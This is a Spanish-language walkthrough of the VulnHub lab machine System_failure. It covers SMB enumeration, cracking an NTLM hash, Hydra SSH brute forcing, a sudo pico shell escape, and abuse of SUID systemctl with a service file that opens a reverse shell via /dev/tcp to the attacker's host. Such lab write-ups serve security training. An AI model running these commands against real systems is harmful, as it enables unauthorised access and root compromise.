# Write Up System\_failure VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 06:39 EDT
Nmap scan report for 192.168.5.197
Host is up (0.00023s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bb:02:d1:ee:91:11:fe:a0:b7:90:e6:e0:07:49:95:85 (RSA)
|   256 ef:e6:04:30:01:50:07:5d:2d:17:99:d1:00:3d:f2:d6 (ECDSA)
|_  256 80:7f:c5:96:0e:3d:66:b9:d6:a8:6f:59:fa:ca:86:36 (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:03:65:BF (VMware)
Service Info: Host: SYSTEMFAILURE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-06-22T10:39:39
|_  start_date: N/A
|_nbstat: NetBIOS name: SYSTEMFAILURE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: \x00
|   NetBIOS computer name: SYSTEMFAILURE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-22T06:39:39-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h19m58s, deviation: 2h18m34s, median: -2s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.60 seconds
```

### enum4linux

```shell
enum4linux <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jun 22 06:40:47 2024

 =========================================( Target Information )=========================================

Target ........... 192.168.5.197
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.5.197 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 192.168.5.197 )===============================

Looking up status of 192.168.5.197
        SYSTEMFAILURE   <00> -         B <ACTIVE>  Workstation Service
        SYSTEMFAILURE   <03> -         B <ACTIVE>  Messenger Service
        SYSTEMFAILURE   <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.5.197 )===================================
                                                                                                                                                             
                                                                                                                                                             
[+] Server 192.168.5.197 allows sessions using username '', password ''                                                                                      
                                                                                                                                                             
                                                                                                                                                             
 ================================( Getting domain SID for 192.168.5.197 )================================
                                                                                                                                                             
Domain Name: WORKGROUP                                                                                                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                         
                                                                                                                                                             
                                                                                                                                                             
 ==================================( OS information on 192.168.5.197 )==================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 192.168.5.197 from srvinfo:                                                                                                              
        SYSTEMFAILURE  Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian                                                                                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 192.168.5.197 )=======================================
                                                                                                                                                             
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: admin    Name:   Desc:                                                                                        
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: superadmin       Name:   Desc: 

user:[admin] rid:[0x3e8]
user:[superadmin] rid:[0x3e9]

 =================================( Share Enumeration on 192.168.5.197 )=================================
                                                                                                                                                             
                                                                                                                                                             
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      open
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

[+] Attempting to map shares on 192.168.5.197                                                                                                                
                                                                                                                                                             
//192.168.5.197/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                                                            
//192.168.5.197/anonymous       Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                   
//192.168.5.197/IPC$    Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.5.197 )===========================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 192.168.5.197 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] SYSTEMFAILURE
        [+] Builtin

[+] Password Info for Domain: SYSTEMFAILURE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 5


 ======================================( Groups on 192.168.5.197 )======================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
                                                                                                                                                             
 ==================( Users on 192.168.5.197 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-22-1                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-992311547-1957423116-3284270811 and logon username '', password ''
```

Vemos que hay un recurso compartido llamado `anonymous` y si nos conectamos a el...

```shell
smbclient //<IP>/anonymous -N
```

Nos descargaremos el unico archivo que hay en su interior...

```shell
get share
```

Y si lo leemos veremos lo siguiente...

> share

```
Guys, I left you access only here to give you my shared file, you have little time, I leave you the login credentials inside for FTP you will find some info, you have to hurry!

89492D216D0A212F8ED54FC5AC9D340B

Admin
```

Vemos que nos da las credenciales del usuario `admin` y con su contraseña codificada para el servicio `ftp`...

Si vemos su contraseña esta codificada en `NTLM` por lo que la intentaremos crackear...

```shell
nano hash

#Dentro del nano
89492D216D0A212F8ED54FC5AC9D340B
```

```shell
hashcat -m 1000 -a 0 hash <WORDLIST>
```

Info:

```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i7-12700H, 1418/2901 MB (512 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

89492d216d0a212f8ed54fc5ac9d340b:qazwsxedc                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 89492d216d0a212f8ed54fc5ac9d340b
Time.Started.....: Sat Jun 22 06:48:26 2024 (0 secs)
Time.Estimated...: Sat Jun 22 06:48:26 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   650.1 kH/s (0.09ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 13%

Started: Sat Jun 22 06:48:10 2024
Stopped: Sat Jun 22 06:48:27 2024
```

Vemos que su contraseña crackeada es `qazwsxedc` por lo que ya tendremos sus credenciales...

```
User = admin
Password = qazwsxedc
```

```shell
ftp admin@<IP>
```

Metemos la contraseña crackeada y ya estariamos dentro...

Pero si probamos por `ssh` podremos entrar tambien, por lo que haremos lo siguiente...

```shell
ssh admin@<IP>
```

Y ya estariamos dentro metiendo la misma contraseña...

Si nos vamos al siguiente directorio...

```shell
cd /var/www/html/area4/Sup3rS3cR37/System
```

Veremos 2 archivos llamado `note.txt` y `useful.txt`

> note.txt

```
Guys, I left something here for you, I know your skills well, we must try to hurry. Not always everything goes the right way.

-Admin
```

> useful.txt

```
andres
courtney
booboo
kissme
harley
ronaldo
iloveyou1!!
precious
october?
inuyasha
peaches
veronica
chris
888888--
adriana
cutie="£
james
banana
prince"%$
friend
jesus1
crystal"
celtic
!"£zxcvbnm
ed£ward
oliv£er
diana
samsu%%ng
freedom
angel&o
kenneth
master
scooby
carmen
456789
sebastian
rebecc\a
jackie
spiderman
christopher
kar|ina
johnny
hotmai"l
0123456789
school
barcelona
august
orlando
samuel
cameron
slipknot
cutiepie
monkey1
50cent
bonita
kevin
bitch
maganda
babyboy
casper
brenda
adidas
kitten
karen
mustang
isabel
natalie
cuteako
javier
789456123
123654
sarah
bowwow
portugal
laura
777777123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
nicole
daniel
babygirl
monkey
lovely
jessica
654321
michael
ashley
qwerty
1a2b3c4d
111111
iloveu
000000
michelle
tigger
sunshine
chocolate
password1
soccer
anthony
friends
butterfly
purple
angel
jordan
liverpool
justin
loveme
fuckyou
123123
football
secret
andrea
carlos
jennifer
joshua
bubbles
1234567890
superman
hannah
amanda
loveyou
pretty
basketball
andrew
angels
tweety
flower
playboy
hello
elizabeth
hottie
tinkerbell
charlie
samantha
barbie
chelsea
lovers
teamo
jasmine
brandon
666666
shadow
melissa
eminem
matthew
robert
danielle
forever
family
jonathan
987654321
computer
whatever
dragon
vanessa
cookie
naruto
summer
sweety
spongebob
joseph
junior
softball
taylor
yellow
daniela
lauren
mickey
princesa
alexandra
alexis
jesus
estrella
miguel
william
thomas
beautiful
mylove
angela
poohbear
patrick
iloveme
sakura
adrian
alexander
destiny
christian
121212
sayang
america
dancer
monica
richard
112233
princess1
555555
diamond
carolina
steven
rangers
louise
orange
789456
999999
shorty
11111
nathan
snoopy
gabriel
hunter
cherry
killer
sandra
alejandro
buster
-find321?!
george
brittany
alejandra
patricia
rachel
tequiero
7777777
cheese
159753
arsenal
dolphin
antonio
heather
david
ginger
stephanie
peanut
blink182
sweetie
222222
beauty
987654
victoria
honey
00000
!toor?
!=parma
fernando
pokemon
maggie
corazon
chicken
pepper
cristina
rainbow
kisses
```

Por lo que se ve parece un diccionario de palabras para usar contra los 2 usuarios que sabemos que hay, por lo que haremos lo siguiente...

```shell
nano users.txt

#Dentro del nano
valex
jin
```

```shell
hydra -L users.txt -P useful.txt -e nsr ssh://<IP> -t 64
```

Utilizamos el parametro `-e nsr` basicamente lo que hace es probar de forma adiccional lo siguiente...

```
- n: Trata con un intento de contraseña vacío (null password).
- s: Utiliza el nombre de usuario como contraseña.
- r: Invierte el nombre de usuario y lo usa como contraseña.
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-22 07:21:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 524 login tries (l:2/p:262), ~9 tries per task
[DATA] attacking ssh://192.168.5.197:22/
[22][ssh] host: 192.168.5.197   login: valex   password: xelav
```

Por lo que vemos la contraseña del usuario `valex` es su nombre al reves...

Por lo que dentro del usuario `admin` haremos lo siguiente...

```shell
su valex
```

Metemos esa contraseña y ya seremos el usuario `valex`...

Leeremos la flag...

> user.txt

```
1871828204892bc09be79e1a02607dbf
```

Si hacemos `sudo -l` veremos lo siguiente...

```
sudo: unable to resolve host SystemFailure: Name or service not known
Matching Defaults entries for valex on SystemFailure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User valex may run the following commands on SystemFailure:
    (jin) NOPASSWD: /usr/bin/pico
```

Podemos ejecutar `pico` como el usuario `jin` por lo que haremos lo siguiente...

URL = https://gtfobins.github.io/gtfobins/pico/#sudo

```shell
sudo -u jin pico

#Dentro de pico
^R ^X
#Dentro de la ejecuccion de comandos
reset; sh 1>&0 2>&0
```

Una vez hecho esto tendremos un `sh` como el usuario `jin` si hacemos...

```shell
clear

whoami
```

Primero limpiaremos la terminal ya que se quedara un poco bugeada y despues para comprobar que salio bien veremos que usuario somos y por ultimo para tener una mejor shell...

```shell
bash
```

Leemos la flag...

> user2.txt

```
172c7b08a7507f08bab7694fd632839e
```

Veremos un archivo llamado `secret.txt` que dice lo siguiente...

```
Reminder: I had left something in /opt/system
```

Nos recuerda que miremos en esa carpeta...

Si hacemos lo siguiente...

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Veremos esto...

```
145891    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   265258     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   142544     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   133686     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
   133688     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
   134291    856 -rwsr-s---   1 root     root         872792 Oct 24  2020 /usr/bin/systemctl
   129833     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
   129834     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
   133361     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
   149540    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo
   133214     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
   129831     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
   129830     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
```

Vemos la siguiente linea...

```
134291    856 -rwsr-s---   1 root     root         872792 Oct 24  2020 /usr/bin/systemctl
```

Por lo que vemos tenemos el `systemctl` con permisos de `SUID`...

URL = https://gtfobins.github.io/gtfobins/systemctl/#suid

```shell
TF=$(mktemp).service
```

```shell
echo '[Service]
> Type=oneshot
> ExecStart=/bin/bash -c "exec bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
> [Install]
> WantedBy=multi-user.target' > $TF
```

```shell
systemctl link $TF
```

Info:

```
Created symlink /etc/systemd/system/tmp.qcwsRReraR.service → /tmp/tmp.qcwsRReraR.service.
```

Y antes de darle al siguiente comando, estaremos a la escucha en nuestro `host`...

```shell
nc -lvnp <PORT>
```

```shell
systemctl enable --now $TF
```

Info:

```
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.qcwsRReraR.service → /tmp/tmp.qcwsRReraR.service.
```

Y despues de ejecutar ese comando, si nos vamos a donde tenemos el escucha veremos que seremos `root` con esa `Reverse Shell`...

Por lo que leeremos la flag...

> .SuP3rFin4Lfl4g.txt

```
╔═╗┬ ┬┌─┐┌┬┐┌─┐┌┬┐  ╔═╗┌─┐┬┬  ┬ ┬┬─┐┌─┐
╚═╗└┬┘└─┐ │ ├┤ │││  ╠╣ ├─┤││  │ │├┬┘├┤ 
╚═╝ ┴ └─┘ ┴ └─┘┴ ┴  ╚  ┴ ┴┴┴─┘└─┘┴└─└─┘

I knew you would succeed.

Oh no.

2527f167fe33658f6b976f3a4ac988dd

Follow me and give feedback on Twitter: 0xJin

L1N5c3QzbUY0aUx1UjIzNTEyNA==
```
